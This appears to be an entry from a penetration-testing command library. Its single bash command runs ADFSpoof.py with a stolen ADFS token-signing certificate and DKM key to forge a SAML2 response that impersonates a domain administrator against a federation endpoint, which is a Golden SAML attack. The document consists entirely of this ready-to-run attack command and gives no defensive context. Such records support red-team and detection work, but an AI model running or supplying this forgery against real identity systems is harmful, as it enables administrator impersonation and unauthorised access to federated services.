---
id: 0551e439-f23a-42df-8c6e-378be2ff00e5
name: Execute ADFSpoof.py with specified parameters
type: command
executor: bash
data: 'python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2
  --endpoint https://www.contoso.com/adfs/ls

  /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient
  --nameid ''PENTEST\\administrator'' --rpidentifier Supervision --assertions ''<Attribute
  Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'''
output: null
created_at: '2023-04-06T03:56:06.583451+00:00'
updated_at: '2023-04-10T20:26:30.729097+00:00'
---

# Execute ADFSpoof.py with specified parameters

```bash
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'
```
